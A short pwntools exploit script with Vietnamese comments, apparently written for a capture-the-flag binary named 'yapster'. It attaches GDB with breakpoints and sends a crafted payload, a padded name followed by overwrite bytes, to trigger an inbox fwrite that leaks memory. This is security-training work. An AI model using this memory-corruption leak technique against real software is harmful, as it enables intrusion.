from pwn import *
exe = ELF('./yapster')
p = process(exe.path)
context.terminal = ['cmd.exe', '/c', 'start', 'cmd.exe', '/c', 'wsl.exe']

gdbscript = '''
b *readInbox+334  
b *sendMessage+455
c
'''
# Gắn GDB vào process đang chạy
gdb.attach(p, gdbscript=gdbscript)

# Tự động gửi payload leak
p.sendlineafter(b"> ", b"1")
p.sendlineafter(b"> ", b"A") 
payload_leak = b"BigHippo85\x00".ljust(32, b"A") + b"B"*8 + b"\xff\n"
p.sendafter(b"> ", payload_leak)

# Đọc inbox để trigger lệnh fwrite
p.sendlineafter(b"> ", b"2")
p.recvline() 

p.interactive()